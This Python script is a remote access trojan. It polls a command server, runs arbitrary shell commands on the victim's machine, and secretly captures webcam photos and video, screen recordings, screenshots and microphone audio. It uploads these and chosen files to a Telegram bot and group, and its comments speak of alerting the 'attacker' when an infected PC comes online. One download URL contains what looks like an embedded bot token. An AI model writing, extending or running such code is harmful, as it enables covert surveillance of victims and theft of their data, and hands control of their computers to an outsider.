# ============================================================================================
# ====================================Importing Libraries=====================================
# ============================================================================================
import subprocess
import numpy as np
import sounddevice as sd
import wavio as wv
import requests
import json
import threading
import os
from time import sleep
import pyautogui
import pathlib
import cv2
# ============================================================================================



# ============================================================================================
#=========================Important Variables=================================================
# ============================================================================================
data = 'ilu'
url = 'xxxxxxxxxxxxxxxxxxxxxxxxx'   // website or domain link
urt = 'https://api.telegram.org/bot<bot_token>/'
group_id = -<telegram group_id>
web_seq = 0
screen_seq = 0
rec_seq = 0
freq = 44100
scr_seq = 0
wbc_seq = 0
# ============================================================================================



# ============================================================================================
# =================Function to tell the person,that you can come online.======================
# ============================================================================================
def sendMessage(mesage):
    parameters = {'chat_id': group_id, 'text': mesage }
    response = requests.post(urt+'sendMessage',data=parameters)
    return 'Message sent'

# ============================================================================================
# =========================Function to upload things to telegram.=============================
# ============================================================================================
def upload_to_telegram(file_name_to_upload):
    path = pathlib.Path().absolute()
    my_file = open(str(path) + f'/{file_name_to_upload}', 'rb')
    parameters = {'chat_id': group_id, 'caption': 'Acer-ES1522'}
    files = {
        'document': my_file
    }
    response = requests.post(urt + 'sendDocument', data=parameters, files=files)
# ============================================================================================

# ============================================================================================
# ======================Function to download things from telegram=============================
# ============================================================================================
def download_to_telegram(file_path):
    dodo = f'https://api.telegram.org/file/bot5827443436:AAFXhzdVNf0KUcE1V_2P0TIrl_rd5MctzBI/{file_path}'
    r = requests.get(dodo, allow_redirects=True)
    open('file1', 'wb').write(r.content)
# ============================================================================================



# ============================================================================================
# =================Function to record the screen for default 10 seconds.======================
# ============================================================================================
def screen_record(duration=10):
    global scr_seq
    scr_seq = scr_seq + 1
    name = f'scr{scr_seq}.avi'
    duration = int(duration)
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    fps = 30
    screen_size = tuple(pyautogui.size())
    out = cv2.VideoWriter(name, fourcc, fps, screen_size)
    record_second = duration
    for i in range(int(fps * record_second)):
        img = pyautogui.screenshot()
        frame = np.array(img)
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        out.write(frame)
    out.release()
    t1 = threading.Thread(target=upload_to_telegram, args=(name,))
    t1.start()
# ============================================================================================


# ============================================================================================
# ================Function to record person's video for default 10 seconds.===================
# ============================================================================================
def web_record(duration=10):
    global wbc_seq
    wbc_seq = wbc_seq+1
    name = f'webs{wbc_seq}.avi'
    cap = cv2.VideoCapture(0)
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    out = cv2.VideoWriter(name, fourcc, 20.0, (640, 480))
    for x in range(0, 20 * int(duration)):
        ret, frame = cap.read()
        out.write(frame)
    cap.release()
    out.release()
    cv2.destroyAllWindows()
    t1 = threading.Thread(target=upload_to_telegram, args=(name,))
    t1.start()
# ============================================================================================


# ============================================================================================
# ========================Function to take a person's picture=================================
# ============================================================================================
def web_cam():
    global web_seq
    web_seq = web_seq + 1
    name = f'web{web_seq}.png'
    cam = cv2.VideoCapture(0)
    cam, image = cam.read()
    cv2.imwrite(f'web{web_seq}.png', image)
    t1 = threading.Thread(target=upload_to_telegram, args=(name,))
    t1.start()


# ============================================================================================
# =============================Function to take a screenshot==================================
# ============================================================================================
def screen_shot():
    global screen_seq
    screen_seq = screen_seq + 1
    name = f'screen{screen_seq}.png'
    image = pyautogui.screenshot()
    path = pathlib.Path().absolute()
    image.save(str(path) + f'/screen{screen_seq}.png')
    t1 = threading.Thread(target=upload_to_telegram, args=(name,))
    t1.start()
# ============================================================================================


# ============================================================================================
# ==================Function to record mic for default 10 seconds.============================
# ============================================================================================
def mic_sound(duration=10):
    global rec_seq
    rec_seq = rec_seq + 1
    name = f"recording{rec_seq}.wav"
    duration = int(duration)
    recording = sd.rec(int(duration * freq), samplerate=freq, channels=2)
    sd.wait()
    wv.write(f"recording{rec_seq}.wav", recording, freq, sampwidth=2)
    t1 = threading.Thread(target=upload_to_telegram, args=(name,))
    t1.start()
# ============================================================================================


# ============================================================================================
# ====================Function to upload a file from PC to Replit=============================
# ============================================================================================
def upload_file(file_name):
    try:
        files = {'file': open(f'{file_name}', 'rb')}
        requests.post(url + '/file', files=files)
        return 'Uploaded!'
    except:
        return 'System Failed!'
# ============================================================================================


# ============================================================================================
# ======================Function to download file from repl server.===========================
# ============================================================================================
def download_file(file_name):
    try:
        data_from_server = requests.get(url + f'/send/{file_name}')
        open(f'{file_name}', 'wb').write(data_from_server.content)
        return 'Downloaded!'
    except:
        return 'Failed!'
# ============================================================================================

#=============================================================================================
#================================Alerting Attacker============================================
#=============================================================================================
def initializing():
    while True:              # Making sure that there will not be error if no internet working
        try:
            sendMessage('Am Alive Babes')   # Alerting attacker.
            break
        except:
            sleep(60)       # Wait a minute to retry.

# ============================================================================================



# ============================================================================================
# ============================================================================================
# ==============================Attacking Started=============================================
# ============================================================================================
# ============================================================================================
#                         #                #                    #
#                        # #  Democracy   # #    Privacy       # #
#                       #   #            #   #                #   #
#                      #     #          #     #              #     #
#                     #       #        #  and  #            #       #
#                    #         #      #         #          #         #
#                   #           #    #           #        #           #
#                  #     are     #  #     Just    #      #   Names     #
#                 #   (  O o       #     ( o o )   #    #     o O )     #
#                #        >         #       V       # #        <          #
#               #                     #          
# ============================================================================================
# ================================Alerting About PC Starts.===================================
# ============================================================================================
initializing()
# ============================================================================================
# ================================Alerting About PC Ends.=====================================
# ============================================================================================



# ============================================================================================
# =================================Infinite Loop Starting=====================================
# ============================================================================================
while True:
    try:
        url_data = requests.post(url, json={'auth': 'ama', 'response': data})
        url_text = url_data.text
        url_json = json.loads(url_text)
        command = url_json['command']
        
        
        # Managing Directory
        if command[:3] == 'cd ':
            try:
                os.chdir(command[3:])
                data = 'Directory Changed!'
            except:
                data = 'Wrong Input'
            continue


            # Screenshot
        elif command == 'screenshot':
            try:    
                screen_shot()
                data = 'Working and Uploading...'
            except:
                data = 'Error occured'
            
            continue


            # Uploading files
        elif command[:6] == 'upload':
            try:    
                data = upload_file(command[7:])
            except:
                data = 'Error occured'
            continue


            # Uploading files using telgram
        elif command[:5] == 'telep':
            try:    
                t1 = threading.Thread(target=upload_to_telegram, args=(command[6:],))
                t1.start()
                data = 'Working and Uploading...'
            except:
                data = 'Error occured!'
            continue


            # Downloading files using telegram
        elif command[:5] == 'teled':
            try:    
                t1 = threading.Thread(target=download_to_telegram, args=(command[6:],))
                t1.start()
                data = 'Working and Uploading...'
            except:
                data = 'Error Occured!'
            continue


            # Downloading files
        elif command[0:8] == 'download':
            try:
                data = download_file(command[9:])
            except:
                data = 'Error occured!'
            continue


            # Recording mic 
        elif command[:8] == 'micsound':
            try:    
                if len(command) > 8:
                    mic_sound(command[9:])
                else:
                    command = mic_sound()
                data = 'Working and Uploading...'
            except:
                data = 'Error Occured!'
            continue


            # Screen Record
        elif command[:12] == 'screenrecord':
            try:
                if len(command) > 12:
                    screen_record(command[13:])
                    data = 'Working and Uploading...'
                    continue
                else:
                    screen_record()
                    data = 'Working and Uploading...'
            except:
                data='Error Occured!'
            continue


            # Recording camera
        elif command[:9] == 'webrecord':
            try:    
                if len(command) > 9:
                    web_record(command[10:])
                else:
                    command = web_record()
                data = 'Working and Uploading...'
            except:
                data = 'Error Occured!'
            continue


            # Taking picture
        elif command == 'webcam':
            try:    
                web_cam()
                data = 'Working and Uploading...'
            except:
                data = 'Error Occured!'
            continue


            # Working over command prompt
        execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                stdin=subprocess.PIPE)
        result = execute.stdout.read() + execute.stderr.read()
        data = result.decode()
    except:
        sleep(30)
